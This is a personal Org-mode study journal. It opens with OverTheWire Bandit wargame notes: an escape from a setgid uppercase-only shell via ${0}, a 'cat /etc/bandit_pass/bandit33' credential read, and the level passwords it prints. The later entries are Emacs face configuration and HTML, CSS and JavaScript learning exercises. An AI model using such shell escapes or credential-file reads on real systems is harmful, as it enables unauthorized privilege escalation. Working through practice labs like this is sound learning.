                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

backend: gibson-1
bandit31-git@bandit.labs.overthewire.org's password: 
Writing objects: 100% (4/4), 361 bytes | 361.00 KiB/s, done.
Total 4 (delta 0), reused 0 (delta 0), pack-reused 0
remote: ### Attempting to validate files... ####        
remote: 
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.        
remote: 
remote: Well done! Here is the password for the next level:        
remote: 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K         
remote: 
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.        
remote: 
To ssh://bandit.labs.overthewire.org:2220/home/bandit31-git/repo
 ! [remote rejected] master -> master (pre-receive hook declined)
error: failed to push some refs to 'ssh://bandit.labs.overthewire.org:2220/home/bandit31-git/repo'
#+end_example

3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K
*** Bandit Level 32 → Level 33

#+begin_quote
Level Goal

After all this git stuff, it’s time for another escape. Good luck!
Commands you may need to solve this level

sh, man
#+end_quote

#+begin_src shell
PASSWORD=3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K
URL=bandit.labs.overthewire.org
PORT=2220
BANDIT=bandit32
echo sshpass -p ${PASSWORD} ssh $URL -p $PORT -l $BANDIT
#+end_src

#+RESULTS:
: sshpass -p 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K ssh bandit.labs.overthewire.org -p 2220 -l bandit32

**** Control keys

| Key | Result                   |
|-----+--------------------------|
| C-D | quit                     |
| C-Z | no echo, but do not quit |
|     |                          |

#+begin_example

>> a
sh: 1: A: Permission denied
>> \
>> $
sh: 1: $: Permission denied
>> 
>> !
sh: 2: Syntax error: newline unexpected
>> !
sh: 2: Syntax error: newline unexpected
>> " 
sh: 2: Syntax error: Unterminated quoted string
>> "bash"
sh: 1: BASH: Permission denied

#+end_example

**** UPPERCASE SHELL: environment variables?

**** The uppershell executable has setgid for bandit33

#+begin_example
bandit31@bandit:/home/bandit32$ ll
total 36
drwxr-xr-x   2 root     root      4096 Aug 15 13:16 ./
drwxr-xr-x 150 root     root      4096 Aug 15 13:18 ../
-rw-r--r--   1 root     root       220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root     root      3851 Aug 15 13:09 .bashrc
-rw-r--r--   1 root     root       807 Mar 31  2024 .profile
-rwsr-x---   1 bandit33 bandit32 15140 Aug 15 13:16 uppershell*
               ^^^^^^^^
#+end_example

**** manpage sh: ${0} gives name of shell

It was executing the expansions.
It executed that, giving me an instance of ~sh~.

#+begin_example
WELCOME TO THE UPPERCASE SHELL
>> ${$}
sh: 1: 625083: Permission denied
>> ${0}
$ cat /etc/bandit_pass/bandit33
tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0
#+end_example

tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0
*** Bandit Level 33 → Level 34

#+begin_quote
At this moment, level 34 does not exist yet.
#+end_quote

* [2025-10-12 Sun]

Today I used a good part of the sunny Sunday to do something I have been wanting to do for years: reset Org Mode font colors; it is /too/ colorful!
I get distracted just by looking at the screen, and trying to figure out the rules for the colors, and the semantics, etc; not very focus-inducing!

This is the result.

** Introduction

This has some face-related functions and settings, including the configuration of the default face for Emacs.

[[file:~/elisp/faces.el][~/elisp/faces.el]] ≡

#+begin_src elisp :tangle ~/elisp/faces.el
<<define the functions>>
<<reset the faces>>
(face-set-after-frame-default (selected-frame))
#+end_src

** Faces

*** ~default~

Reset face: all settings to default.

~<<reset the faces>> +≡~

#+begin_src elisp :noweb-ref reset the faces
(face-reset 'default)
#+end_src

*** Org

Go nuclear: Reset all Org faces.

~<<reset the faces>> +≡~

#+begin_src elisp :noweb-ref reset the faces
<<push all known Org faces into a list>>
<<reset all Org faces from that list>>
#+end_src

~<<push all known Org faces into a list>> +≡~

#+begin_src elisp :noweb-ref push all known Org faces into a list
;; Collect all org faces
(setq org-faces (seq-filter
                 (lambda (face)
                   (string-prefix-p "org-" (symbol-name face)))
                 (face-list)))
#+end_src

~<<reset all Org faces from that list>> +≡~

#+begin_src elisp :noweb-ref reset all Org faces from that list
(face-reset-list org-faces)
#+end_src

** Functions

~<<define the functions>> +≡~

#+begin_src elisp :noweb-ref define the functions
<<define a function to reset a face>>
<<define a function to reset a list of faces>>
#+end_src

*** ~face-reset~

~<<define a function to reset a face>> +≡~

#+begin_src elisp :noweb-ref define a function to reset a face
(defun face-reset (face)
  "Sets FACE attributes to absolute and average values."
  (interactive)
  (set-face-attribute
   face
   <<FRAME>>
   <<&rest ARGS>>))
#+end_src

**** Frame

We set it to ~t~, this way new frames honor it.

#+begin_quote
If FRAME is a frame, set the FACE’s attributes only for that frame.  If
FRAME is nil, set attribute values for all existing frames, as well as
the default for new frames.  If FRAME is t, change the default values
of attributes for new frames.
#+end_quote

~<<FRAME>> +≡~

#+begin_src elisp :noweb-ref FRAME
t
#+end_src

**** ~family~ and ~foundry~

~<<&rest ARGS>> +≡~

#+begin_src elisp  :noweb-ref &rest ARGS
:family "Lat15Fixed16"
:foundry "PfEd"
#+end_src

**** ~width~ and ~height~

#+begin_quote
Note that for the ‘default’ face, you must specify an absolute height (since there is nothing for it to be relative to).
#+end_quote

This height was being used before I started working.
I am not sure what it means, or how it is calculated.

~<<&rest ARGS>> +≡~

#+begin_src elisp :noweb-ref &rest ARGS
:width 'normal
:height 128
#+end_src

**** ~weight~ and ~slant~

~<<&rest ARGS>> +≡~

#+begin_src elisp :noweb-ref &rest ARGS
:weight 'medium
:slant 'normal
#+end_src

**** ~foreground~ and ~background~

~<<&rest ARGS>> +≡~

#+begin_src elisp :noweb-ref &rest ARGS
:foreground "dark gray"
:background "black"
#+end_src

**** Decorations

~<<&rest ARGS>> +≡~

#+begin_src elisp :noweb-ref &rest ARGS
:underline nil
:overline nil
:strike-through nil
:box nil
#+end_src

**** ~inverse-video~

~<<&rest ARGS>> +≡~

#+begin_src elisp :noweb-ref &rest ARGS
:inverse-video nil
#+end_src

**** ~stipple~

~<<&rest ARGS>> +≡~

#+begin_src elisp :noweb-ref &rest ARGS
:stipple nil
#+end_src

**** ~extend~

~<<&rest ARGS>> +≡~

#+begin_src elisp :noweb-ref &rest ARGS
:extend nil
#+end_src

**** ~font~

Don't see the need for this.

~<<&rest ARGS>> +≡~

**** ~inherit~

#+begin_src elisp :noweb-ref &rest ARGS
:inherit nil
#+end_src

*** ~face-reset-list~

~<<define a function to reset a list of faces>> +≡~

#+begin_src elisp :noweb-ref define a function to reset a list of faces
(defun face-reset-list (face-list)
  "Apply function `face-reset' to a list of faces."
  (interactive)
  ;; Lists of faces usually are automatically obtained by taking all symbols
  ;; from a context with "face" in their names.  But surprisingly this is not an
  ;; infallible approach.  Then we ignore any errors here.  This is not bad,
  ;; because we only ignore---and do not-reset---the ones that are _not_ faces.
  (ignore-errors
    (dolist (face face-list)
      (face-reset face))))
#+end_src


** Seinfeld Checkmark

[[file:images/2025-10-12_seinfeld.jpeg]]

* [2025-10-11 Sat]

Productive day.
But only because learned about my limitations while struggling to get results.
Learned a lot!

** Seinfeld Checkmark

[[file:images/2025-10-11_seinfeld.jpeg]]

* [2025-10-10 Fri]

Well, I'm pursuing some CTF goals.
Totally derailed.
But, I am investigating my core reasons to program.
The burn out happened because of lack of this.

Nice.

** Seinfeld Checkmark

[[file:images/2025-10-10_seinfeld.jpeg]]

* [2025-10-09 Thu]

** Back to Odin

Now that I had a taste of the "ground truth" (official specs), I feel more confident about navigating the uncertainties and vagueness of the world.
Also, Wikipedia has a lot of good resources on alternatives to The Box Model...
I probably need to improve my Google-fu.

I feel that I tend to underestimate CSS.
I've been thinking about this.
Webdev is HTML, CSS, and JS.
Instinctively, I think: JS is harder than HTML, that is harder than CSS.
But this is not the case---at least for me.
CSS has lots of intellectual demands:
- The official docs are declarative: they don't teach how to implement, but what they want as a result (from the browser implementers).
  This removes a lot of pressure that is usually present when defining a language (like JS and even HTML).
  The documentation is more vague, there are lots of exceptions.
  And what trips me up the most is the terminology.
  It all started in CSS1 with
  - For the background: ~background-color~
  - For the foreground: ~color~ (!)


This list goes on and on.
I belive it stems from the fact that the people involved with the development of CSS have a different mindset than what I'm used to when dealing with tech specs.
And this is probably good, because they are also developing an aspect that is normally difficult for programmers: make things look good.
And I've seen what CSS can do, and it's great.
Also, I've seen the latest developments in layout---this is what made me go to the specs, I couldn't believe The Box Model could be a thing they would settle on---and thank God they didn't!
During this journey I learned a lot about realistic expectations on webdev and stuff---including my own capabilities and limits.
The most important thing was to see that when I go slowly on a CSS exercise things tend to flow better, and quicker.
My initial impulse is to underestimate and get frustrated with the delay, lack of info... when I could just stop, take a deep breath, and dedicate some time to think.

Another curious development: my inner artist is coming out, sniffing the territory, and I catch myself sometimes thinking about ideas for websites.
This is cool!

** Seinfeld Checkmark

[[file:images/2025-10-09_seinfeld.jpeg]]

* [2025-10-08 Wed]

** CSS1 Standard

See how things evolved is good when there is so much confusion in the terminology.

The margin collapse from the Box Model makes sense for typography, not graphics layout.
It was introduced at a time where you /maybe/ would add a picture to a page; a time where the page was thought as a /book/ or /newspaper/ page (but without ads, comic strips or other elements demanding a more sophisticated and precise layout engine).

It was also the /first/ major attempt at adding styles to a page.
/Style/ at that time was mainly choosing the text font, and color; background color or image.
And back then, many users had only access to text terminals, so the important part of the page for them was mainly the text, and its structure.

I keep going back and forth from the specs to ChatGPT.
ChatGPT is great to teach me about the historical context.
It also makes great parallels with newer versions, points out things that have changed over time.
And it agrees with me about the quirks---but also often gives plausible motivations at the time for the quirks.

I just found out that modern alternatives like Flex and Grid do not collapse margins.
Thank God for them.
But this is not screamed all over the web tutorials as I believe it should be.
Advices like:

#+begin_quote
Avoid using the box model for layout, use the flex model instead.
#+end_quote

Just finished reading it.
Very nice.
Lots of quirks.

The one thing I really think would be useful is: when setting a property valeu, being able to reference the /current/ value.
For instance: If I want to make the first letter of a paragraph twice as big, I could say something like:

#+begin_src css
p::first-letter {
  font-size: calc(current * 2);  /* or  '2*'  */
}
#+end_src

Or if I wanted it to be 10 pixels bigger:

#+begin_src css
p::first-letter {
  font-size: calc(current + 10px);
}
#+end_src

** CSS2.1 Standard

It mentions "webmasters" LOL.

Starts talking about JavaScript.

** Seinfeld Checkmark

[[file:images/2025-10-08_seinfeld.jpeg]]

* [2025-10-07 Tue]

** CSS has some obscurities

The first one just appeared: The Box Model.
I'll try and be systematic here.

Reading CSS Standar Box Model.
https://www.w3.org/TR/css-box-3/

Again, much better.
Tutorials and books are hesitant about terminology and analogies.
Better go to the source.

First small joy: yes, everything in CSS is either a *box* or a *text sequence*.
CSS has its own tree, the *box tree*, derived from the DOM.

[[file:pages/css2.1-margins-padding-border.html][pages/css2.1-margins-padding-border.html]] ≡

#+begin_src html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<HTML>
  <HEAD>
    <TITLE>Examples of margins, padding, and borders</TITLE>
    <STYLE type="text/css">
    </STYLE>
    <link rel="stylesheet" href="css2.1-margins-padding-border-experiments.css">
  </HEAD>
  <BODY>
    
    <div class="ul">
      <UL>
        <div class="li">
          <LI >First element of list
        </div>
        <div class="li">
          <LI class="withborder">Second element of list is a bit longer to illustrate wrapping.
        </div>
      </UL>
      <p class="undecided-p">Is this a paragraph or a list item?</p>
    </div>
  </BODY>
</HTML>
#+end_src

** I started reading CSS1 specs

Very enlightening.
Using ChatGPT to answer questions; usualy involve historical quirks.

** 1h coding

Today I really spent most of the time on the specs.
I also did lots of free explorations on the Dev Tools in Firefox, with the help of ChatGPT.
I'm counting those as coding; all in all, I feel today's work granted me that.

** Seinfeld Checkmark

[[file:images/2025-10-07_seinfeld.jpeg]]

* [2025-10-06 Mon]

** Odin Foundations Course

Started reding the theory for The Box Model.

Went do MDN and ChatGPT for clarifications.

Downloading some CSS books for reference.

Just read some chapters of some CSS books.
Nice to see they have much more structure than several online resources---editorial pressure, probably.

Now, I need to *practice*.

** Burn out WARNING

Today I studied too much, didn't go busking, and didn't properly rest.

I'll work on my 1h coding now, and then rest.

** 1h of Hack!

I'll experiment with LP.
Two code blocks: HTML and JS.

First we tangle.

[[file:~/dev/js-ChatGPT/2025-10-06.html][~/dev/js-ChatGPT/2025-10-06.html]] ≡

#+begin_src html :tangle ~/dev/js-ChatGPT/2025-10-06.html
<!DOCTYPE html>

<html lang="en">

  <head>
    <meta charset="UTF-8">
    <title>JS with ChatGPT</title>
  </head>

  <body>
    <dl>
      <<html>>
    </dl>

    <script>
      <<js>>
    </script>
  </body>
</html>
#+end_src

*** Minute 40–50: Keyboard events
Now the task:
#+begin_quote
Minute 40–50: Keyboard events
16. Add a <p> that shows which key the user presses (keydown event).
Learn: event.key.
#+end_quote

~<<html>> +≡~

#+begin_src html :noweb-ref html
<dt>Keyboard Events</dt>
<dd><p id="pKeyPress"></p></dd>
#+end_src

~event.key~

Need to add an event listener.
Will add it to ~window~.

~<<js>> +≡~

#+begin_src js :noweb-ref js
const pKeyPress = document.getElementById("pKeyPress");
window.addEventListener("keydown", (e) => {
    pKeyPress.textContent = e.key;
})
#+end_src

*** Minute 50–60: Mini-project — Guess the Number

#+begin_quote
Minute 50–60: Mini-project — Guess the Number
17. Build a simple game:

Generate a random number between 1 and 10.

Add an <input> and a button.

User guesses the number. Show “Too high”, “Too low”, or “Correct!”.
Learn: combining input, random, conditionals, and DOM updates.
#+end_quote

Add the controls.
Will use a ~dl~.

~<<html>> +≡~

#+begin_src html :noweb-ref html
<dt>Guess the number</dt>
<dd>Enter a number between 1 and 10</dd>
<dd><input id="inputGuessNumber" type="text"><button id="buttonGuessNumber">Go!</button></dd>
<dd>Result:</dd>
<dd id="ddGuessNumberResult"></dd>
#+end_src

Create a function to choose a random number between 1 and 10.

~<<js>> +≡~

#+begin_src js :noweb-ref js
<<allow user to press Enter instead of clicking the button>>
let number = Math.floor(Math.random() * 10) + 1;
const ddGuessNumberResult = document.getElementById("ddGuessNumberResult");
document.getElementById("buttonGuessNumber")
    .addEventListener("click", () => {
        let guess = Number(document.getElementById("inputGuessNumber").value);
        if (guess < number) {
            ddGuessNumberResult.textContent = "Too low";
        } else {
            if (guess > number) {
                ddGuessNumberResult.textContent = "Too High";
            } else {
                ddGuessNumberResult.textContent = "Correct!";
            }
        }
    });
#+end_src

** Seinfeld Checkmark

[[file:images/2025-10-06_seinfeld.jpeg]]

* [2025-10-05 Sun]

** web.dev HTML Course

Going over the curriculum again, this time specifically to know which *projects* it has.

** ~hr~

Thematic changes.
The Standard says ~section~ and ~hr~ have some "equivalences"---let's experiment with them.

[[file:~/dev/webdev-study/pages/hr.html][~/dev/webdev-study/pages/hr.html]] ≡

#+begin_src html :tangle pages/hr.html :mkdirp yes
<!DOCTYPE html>

<html lang="en">

  <head>
    <meta charset="UTF-8">
    <title>&lt;hr&gt;</title>
  </head>

  <body>
    <p>Aliquam erat volutpat.  Nunc eleifend leo vitae magna.  In id erat non orci commodo lobortis.  Proin neque massa, cursus ut, gravida ut, lobortis eget, lacus.  Sed diam.  Praesent fermentum tempor tellus.  Nullam tempus.  Mauris ac felis vel velit tristique imperdiet.  Donec at pede.  Etiam vel neque nec dui dignissim bibendum.  Vivamus id enim.  Phasellus neque orci, porta a, aliquet quis, semper a, massa.  Phasellus purus.  Pellentesque tristique imperdiet tortor.  Nam euismod tellus id erat.</p>

    <p>Nullam eu ante vel est convallis dignissim.  Fusce suscipit, wisi nec facilisis facilisis, est dui fermentum leo, quis tempor ligula erat quis odio.  Nunc porta vulputate tellus.  Nunc rutrum turpis sed pede.  Sed bibendum.  Aliquam posuere.  Nunc aliquet, augue nec adipiscing interdum, lacus tellus malesuada massa, quis varius mi purus non odio.  Pellentesque condimentum, magna ut suscipit hendrerit, ipsum augue ornare nulla, non luctus diam neque sit amet urna.  Curabitur vulputate vestibulum lorem.  Fusce sagittis, libero non molestie mollis, magna orci ultrices dolor, at vulputate neque nulla lacinia eros.  Sed id ligula quis est convallis tempor.  Curabitur lacinia pulvinar nibh.  Nam a sapien.</p>

    <hr>

    <p>Lorem ipsum dolor sit amet, consectetuer adipiscing elit.  Donec hendrerit tempor tellus.  Donec pretium posuere tellus.  Proin quam nisl, tincidunt et, mattis eget, convallis nec, purus.  Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus.  Nulla posuere.  Donec vitae dolor.  Nullam tristique diam non turpis.  Cras placerat accumsan nulla.  Nullam rutrum.  Nam vestibulum accumsan nisl.</p>

    <hr>

    <section>
      <p>Aliquam erat volutpat.  Nunc eleifend leo vitae magna.  In id erat non orci commodo lobortis.  Proin neque massa, cursus ut, gravida ut, lobortis eget, lacus.  Sed diam.  Praesent fermentum tempor tellus.  Nullam tempus.  Mauris ac felis vel velit tristique imperdiet.  Donec at pede.  Etiam vel neque nec dui dignissim bibendum.  Vivamus id enim.  Phasellus neque orci, porta a, aliquet quis, semper a, massa.  Phasellus purus.  Pellentesque tristique imperdiet tortor.  Nam euismod tellus id erat.</p>

      <p>Nullam eu ante vel est convallis dignissim.  Fusce suscipit, wisi nec facilisis facilisis, est dui fermentum leo, quis tempor ligula erat quis odio.  Nunc porta vulputate tellus.  Nunc rutrum turpis sed pede.  Sed bibendum.  Aliquam posuere.  Nunc aliquet, augue nec adipiscing interdum, lacus tellus malesuada massa, quis varius mi purus non odio.  Pellentesque condimentum, magna ut suscipit hendrerit, ipsum augue ornare nulla, non luctus diam neque sit amet urna.  Curabitur vulputate vestibulum lorem.  Fusce sagittis, libero non molestie mollis, magna orci ultrices dolor, at vulputate neque nulla lacinia eros.  Sed id ligula quis est convallis tempor.  Curabitur lacinia pulvinar nibh.  Nam a sapien.</p>
    </section>

    <p>Lorem ipsum dolor sit amet, consectetuer adipiscing elit.  Donec hendrerit tempor tellus.  Donec pretium posuere tellus.  Proin quam nisl, tincidunt et, mattis eget, convallis nec, purus.  Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus.  Nulla posuere.  Donec vitae dolor.  Nullam tristique diam non turpis.  Cras placerat accumsan nulla.  Nullam rutrum.  Nam vestibulum accumsan nisl.</p>
  </body>
</html>
#+end_src

Visually, there's no explicit "equivalence"; maybe we need some CSS for that.

** ~pre~

[[file:pages/pre.html][pages/pre.html]] ≡

#+begin_src html :tangle pages/pre.html
<!DOCTYPE html>

<html lang="en">

  <head>
    <meta charset="UTF-8">
    <title>&lt;pre&gt;</title>
  </head>

  <body>
    <h1>The <code>&lt;pre&gt; element</code></h1>
    <h2>Just <code>&lt;pre&gt;</code></h2>
    <pre>
      function greet(name) {
        console.log(`Hello, ${name}`);
      }
    </pre>

    <h2><code>&lt;pre&gt;&lt;code&gt;&lt;code&gt;&lt;pre&gt;</code></h2>
    <pre>
      <code>
        function greet(name) {
          console.log(`Hello, ${name}`);
        }
      </code>
    </pre>
  </body>
</html>
#+end_src

Both use monospaced fonts.

** ~kbd~

[[file:pages/kbd.html][pages/kbd.html]] ≡

#+begin_src html :tangle pages/kbd.html
<!DOCTYPE html>

<html lang="en">

  <head>
    <meta charset="UTF-8">
    <title></title>
  </head>

  <body>
    <pre><samp>You are in an open field west of a big white house with a boarded
front door.
There is a small mailbox here.

></samp> <kbd>open mailbox</kbd>

<samp>Opening the mailbox reveals:
A leaflet.

></samp></pre>
  </body>
</html>
#+end_src

Initial whitespace ("prefixing" w.) matters.

** ~blockquote~

[[file:pages/blockquote.html][pages/blockquote.html]] ≡

#+begin_src html :tangle pages/blockquote.html
<!DOCTYPE html>

<html lang="en">

  <head>
    <meta charset="UTF-8">
    <title></title>
  </head>

  <body>
    <blockquote>
      <p>I contend that we are both atheists. I just believe in one fewer
        god than you do. When you understand why you dismiss all the other
        possible gods, you will understand why I dismiss yours.</p>
    </blockquote>
    <p>— Stephen Roberts</p>
    <hr>
    <figure>
      <blockquote>
        <p>The truth may be puzzling. It may take some work to grapple with.
          It may be counterintuitive. It may contradict deeply held
          prejudices. It may not be consonant with what we desperately want to
          be true. But our preferences do not determine what's true. We have a
          method, and that method helps us to reach not absolute truth, only
          asymptotic approaches to the truth — never there, just closer
          and closer, always finding vast new oceans of undiscovered
          possibilities. Cleverly designed experiments are the key.</p>
      </blockquote>
      <figcaption>Carl Sagan, in "<cite>Wonder and Skepticism</cite>", from
        the <cite>Skeptical Inquirer</cite> Volume 19, Issue 1 (January-February
        1995)</figcaption>
        </figure>
    <hr/>
    <article>
      <h1><a href="https://bacon.example.com/?blog=109431">Bacon on a crowbar</a></h1>
      <article>
        <header><strong>t3yw</strong> 12 points 1 hour ago</header>
        <p>I bet a narwhal would love that.</p>
        <footer><a href="?pid=29578">permalink</a></footer>
        <article>
          <header><strong>greg</strong> 8 points 1 hour ago</header>
          <blockquote><p>I bet a narwhal would love that.</p></blockquote>
          <p>Dude narwhals don't eat bacon.</p>
          <footer><a href="?pid=29579">permalink</a></footer>
          <article>
            <header><strong>t3yw</strong> 15 points 1 hour ago</header>
            <blockquote>
              <blockquote><p>I bet a narwhal would love that.</p></blockquote>
              <p>Dude narwhals don't eat bacon.</p>
            </blockquote>
            <p>Next thing you'll be saying they don't get capes and wizard
              hats either!</p>
            <footer><a href="?pid=29580">permalink</a></footer>
            <article>
              <article>
                <header><strong>boing</strong> -5 points 1 hour ago</header>
                <p>narwhals are worse than ceiling cat</p>
                <footer><a href="?pid=29581">permalink</a></footer>
              </article>
            </article>
          </article>
        </article>
        <article>
          <header><strong>fred</strong> 1 points 23 minutes ago</header>
          <blockquote><p>I bet a narwhal would love that.</p></blockquote>
          <p>I bet they'd love to peel a banana too.</p>
          <footer><a href="?pid=29582">permalink</a></footer>
        </article>
      </article>
    </article>
    <hr>
    <p>He began his list of "lessons" with the following:</p>
    <blockquote>One should never assume that his side of
      the issue will be recognized, let alone that it will
      be conceded to have merits.</blockquote>
    <p>He continued with a number of similar points, ending with:</p>
    <blockquote>Finally, one should be prepared for the threat
      of breakdown in negotiations at any given moment and not
      be cowed by the possibility.</blockquote>
    <p>We shall now discuss these points...</p>
  </body>
</html>
#+end_src

** ~ol~

[[file:pages/ol.html][pages/ol.html]] ≡

#+begin_src html :tangle pages/ol.html
<!DOCTYPE html>

<html lang="en">

  <head>
    <meta charset="UTF-8">
    <title>ol</title>
  </head>

  <body>
    <p>I have lived in the following countries (given in the order of when
      I first lived there):</p>
    <hr>
    <ol>
      <li>Switzerland
        <li>United Kingdom
          <li>United States
            <li>Norway
    </ol>
    <hr>
    <ol start="-1">
      <li>Switzerland
        <li>United Kingdom
          <li>United States
            <li>Norway
    </ol>
    <hr>
    <ol reversed>
      <li>Switzerland
        <li>United Kingdom
          <li>United States
            <li>Norway
    </ol>
    <hr>
    <ol reversed start="3">
      <li>Switzerland
        <li>United Kingdom
          <li>United States
            <li>Norway
    </ol>
    <hr>
    <ol reversed start="2">
      <li>Switzerland
        <li>United Kingdom
          <li>United States
            <li>Norway
    </ol>
    <hr>
    <ol type="I" start="-1">
      <li>Switzerland
        <li>United Kingdom
          <li>United States
            <li>Norway
    </ol>
    <hr>
    <ol type="i" start="-1">
      <li>Switzerland
        <li>United Kingdom
          <li>United States
            <li>Norway
    </ol>
    <hr>
    <ol type="A" start="-1">
      <li>Switzerland
        <li>United Kingdom
          <li>United States
            <li>Norway
    </ol>
    <hr>
    <ol type="a" start="-1">
      <li>Switzerland
        <li>United Kingdom
          <li>United States
            <li>Norway
    </ol>
  </body>
</html>
#+end_src

** ~menu~

[[file:pages/menu.html][pages/menu.html]] ≡

#+begin_src html :tangle pages/menu.html
<!DOCTYPE html>

<html lang="en">

  <head>
    <meta charset="UTF-8">
    <title>menu</title>
  </head>

  <body>
    <menu>
      <li><button onclick="copy()"><img src="copy.svg" alt="Copy"></button></li>
      <li><button onclick="cut()"><img src="cut.svg" alt="Cut"></button></li>
      <li><button onclick="paste()"><img src="paste.svg" alt="Paste"></button></li>
    </menu>
  </body>
</html>
#+end_src

** ~dl~

[[file:pages/dl.html][pages/dl.html]] ≡

#+begin_src html :tangle pages/dl.html
<!DOCTYPE html>

<html lang="en">

  <head>
    <meta charset="UTF-8">
    <title>dl</title>
  </head>

  <body>
    <dl>
      <dt> Authors
        <dd> John
          <dd> Luke
            <dt> Editor
              <dd> Frank
    </dl>
    <hr>
    <dl>
      <div itemscope itemtype="http://schema.org/Product">
        <dt itemprop="name">Café ou Chocolat Liégeois
          <dd itemprop="offers" itemscope itemtype="http://schema.org/Offer">
            <span itemprop="price">3.50</span>
            <data itemprop="priceCurrency" value="EUR">€</data>
            <dd itemprop="description">
              2 boules Café ou Chocolat, 1 boule Vanille, sauce café ou chocolat, chantilly
      </div>

      <div itemscope itemtype="http://schema.org/Product">
        <dt itemprop="name">Américaine
          <dd itemprop="offers" itemscope itemtype="http://schema.org/Offer">
            <span itemprop="price">3.50</span>
            <data itemprop="priceCurrency" value="EUR">€</data>
            <dd itemprop="description">
              1 boule Crème brûlée, 1 boule Vanille, 1 boule Caramel, chantilly
      </div>
    </dl>
    <hr>
    <dl>
      <dt><dfn>happiness</dfn></dt>
      <dd class="pronunciation">/ˈhæpinəs/</dd>
      <dd class="part-of-speech"><i><abbr>n.</abbr></i></dd>
      <dd>The state of being happy.</dd>
      <dd>Good fortune; success. <q>Oh <b>happiness</b>! It worked!</q></dd>
      <dt><dfn>rejoice</dfn></dt>
      <dd class="pronunciation">/rɪˈdʒɔɪs/</dd>
      <dd><i class="part-of-speech"><abbr>v.intr.</abbr></i> To be delighted oneself.</dd>
      <dd><i class="part-of-speech"><abbr>v.tr.</abbr></i> To cause one to be delighted.</dd>
    </dl>
  </body>
</html>
#+end_src

** ~figure~

Things with a caption.

[[file:pages/figure.html][pages/figure.html]] ≡

#+begin_src html :tangle pages/figure.html
<!DOCTYPE html>

<html lang="en">

  <head>
    <meta charset="UTF-8">
    <title>figure</title>
  </head>

  <body>
    <p>In <a href="#l4">listing 4</a> we see the primary core interface
      API declaration.</p>
    <figure id="l4">
      <figcaption>Listing 4. The primary core interface API declaration.</figcaption>
      <pre><code>interface PrimaryCore {
  boolean verifyDataLine();
  undefined sendData(sequence&lt;byte> data);
  undefined initSelfDestruct();
}</code></pre>
    </figure>
    <p>The API is designed to use UTF-8.</p>
    <hr/>
    <figure>
      <figcaption>The castle through the ages: 1423, 1858, and 1999 respectively.</figcaption>
      <figure>
        <figcaption>Etching. Anonymous, ca. 1423.</figcaption>
        <img src="castle1423.jpeg" alt="The castle has one tower, and a tall wall around it.">
      </figure>
      <figure>
        <figcaption>Oil-based paint on canvas. Maria Towle, 1858.</figcaption>
        <img src="castle1858.jpeg" alt="The castle now has two towers and two walls.">
      </figure>
      <figure>
        <figcaption>Film photograph. Peter Jankle, 1999.</figcaption>
        <img src="castle1999.jpeg" alt="The castle lies in ruins, the original tower all that remains in one piece.">
      </figure>
    </figure>
    <hr/>
    <figure>
      <img src="castle1423.jpeg" title="Etching. Anonymous, ca. 1423."
        alt="The castle has one tower, and a tall wall around it.">
      <img src="castle1858.jpeg" title="Oil-based paint on canvas. Maria Towle, 1858."
        alt="The castle now has two towers and two walls.">
      <img src="castle1999.jpeg" title="Film photograph. Peter Jankle, 1999."
        alt="The castle lies in ruins, the original tower all that remains in one piece.">
      <figcaption>The castle through the ages: 1423, 1858, and 1999 respectively.</figcaption>
    </figure>
  </body>
</html>
#+end_src

** ~main~

[[file:pages/main.html][pages/main.html]] ≡

#+begin_src html :tangle pages/main.html
<!DOCTYPE html>
<html lang="en">
  <title>RPG System 17</title>
  <style>
  header, nav, aside, main, footer {
    margin: 0.5em; border: thin solid; padding: 0.5em;
    background: #EFF; color: black; box-shadow: 0 0 0.25em #033;
  }
  h1, h2, p { margin: 0; }
  nav, main { float: left; }
  aside { float: right; }
  footer { clear: both; }
  </style>
  <header>
    <h1>System Eighteen</h1>
  </header>
  <nav>
    <a href="../16/">← System 17</a>
    <a href="../18/">RPXIX →</a>
  </nav>
  <aside>
    <p>This system has no HP mechanic, so there's no healing.
  </aside>
  <main>
    <h2>Character creation</h2>
    <p>Attributes (magic, strength, agility) are purchased at the cost of one point per level.</p>
    <h2>Rolls</h2>
    <p>Each encounter, roll the dice for all your skills. If you roll more than the opponent, you win.</p>
  </main>
  <footer>
    <p>Copyright © 2013
  </footer>
</html>
#+end_src

[[file:pages/main-2.html][pages/main-2.html]] ≡

#+begin_src html :tangle pages/main-2.html
<!doctype html>
<html lang=en-CA>
<meta charset=utf-8>
<title> … </title>
<link rel=stylesheet href=spa.css>
<script src=spa.js async></script>
<nav>
 <a href=/>Home</a>
 <a href=/about>About</a>
 <a href=/contact>Contact</a>
</nav>
<main>
 <h1>Home</h1>
 …
</main>
<main hidden>
 <h1>About</h1>
 …
</main>
<main hidden>
  <h1>Contact</h1>
  …
</main>
<footer>Made with ❤️ by <a href=https://example.com/>Example 👻</a>.</footer>
#+end_src

** ~em~ and ~strong~

- ~em~ is for *emphasis*
  - same voice, different tone
  - ~i~: different voice
- ~strong~ is for *importance*
  - ~b~: keywords

** ~small~

For small print.

[[file:pages/small.html][pages/small.html]] ≡

#+begin_src html :tangle pages/small.html
<!DOCTYPE html>

<html lang="en">

  <head>
    <meta charset="UTF-8">
    <title>small</title>
  </head>

  <body>
    <p>Example Corp today announced record profits for the
      second quarter <small>(Full Disclosure: Foo News is a subsidiary of
      Example Corp)</small>, leading to speculation about a third quarter
      merger with Demo Group.
    </p>
    <p><q>This is correct</q>, said Ian.</p>
  </body>
</html>
#+end_src

** Web Workers

[[file:pages/web-worker.html][pages/web-worker.html]] ≡

#+begin_src html :tangle pages/web-worker.html
<!DOCTYPE HTML>
<html lang="en">
 <head>
